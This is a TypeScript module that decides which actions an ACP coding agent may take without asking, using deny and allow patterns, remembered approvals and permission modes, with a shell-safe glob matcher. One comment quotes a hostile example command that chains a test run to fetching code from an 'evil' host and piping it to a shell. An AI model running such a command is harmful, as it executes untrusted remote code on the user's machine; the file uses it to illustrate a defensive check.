/**
 * What an ACP agent may do without asking. Decisions, in order:
 *   1. `deny` patterns           → refuse
 *   2. `allow` patterns, or "always" answers given this session → allow
 *   3. the agent's permission:   yolo allows everything; plan allows only looking;
 *                                accept-edits (default) allows looking and editing
 *   4. anything else             → ask the user (interface or terminal); refuse if no one can answer
 *
 * Patterns: "kind" (read, edit, delete, move, search, execute, think, fetch, other) or
 * "kind:glob" matched against the command, or else the title or path ("execute:npm test*").
 */
import type { AgentProfile } from "./types.ts";

export interface PermissionRequest {
  agent: string;
  /** ACP tool kind. */
  kind: string;
  title: string;
  /** For execute: the command line, when the agent says. */
  command?: string;
  paths: string[];
}

export type Answer = "once" | "always" | "deny";
export type Asker = (req: PermissionRequest) => Promise<Answer>;

const LOOK = ["read", "search", "think", "fetch"];
const EDIT = ["edit"];

/** `*` and `?`; for commands they never match shell syntax that chains or redirects (; & | ` $ < >). */
function glob(pattern: string, text: string, shell = false): boolean {
  const any = shell ? "[^;&|`$<>\\n]*" : ".*";
  const re = new RegExp(`^${pattern.replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*/g, any).replace(/\?/g, shell ? "[^;&|`$<>\\n]" : ".")}$`, "s");
  return re.test(text);
}

export function matches(pattern: string, req: PermissionRequest): boolean {
  const i = pattern.indexOf(":");
  const kind = i < 0 ? pattern : pattern.slice(0, i);
  if (kind !== req.kind && kind !== "*") return false;
  if (i < 0) return true;
  const g = pattern.slice(i + 1);
  // "execute:npm test*" must not approve "npm test; curl evil | sh".
  if (req.command !== undefined) return glob(g, req.command, true);
  return [req.title, ...req.paths].some((t) => glob(g, t));
}

/** The rule an "always" answer remembers: this exact command (or title) for this kind. */
export const alwaysRule = (req: PermissionRequest) => `${req.kind}:${req.command ?? req.title}`;

export function policy(profile: AgentProfile, req: PermissionRequest, always: Set<string> = new Set()): "allow" | "deny" | "ask" {
  if (profile.deny?.some((p) => matches(p, req))) return "deny";
  if (profile.allow?.some((p) => matches(p, req)) || always.has(alwaysRule(req))) return "allow";
  const mode = profile.permission ?? "accept-edits";
  if (mode === "yolo") return "allow";
  if (LOOK.includes(req.kind)) return "allow";
  if (mode === "plan") return "deny";
  if (EDIT.includes(req.kind)) return "allow";
  return "ask";
}

export function describe(req: PermissionRequest): string {
  const what = req.command ? `\`${req.command}\`` : req.paths.length ? req.paths.join(", ") : req.title;
  const why = req.command && req.title && req.title !== req.command ? ` — ${req.title}` : "";
  return `${req.agent} wants to ${req.kind === "execute" ? "run" : req.kind} ${what}${why}`;
}
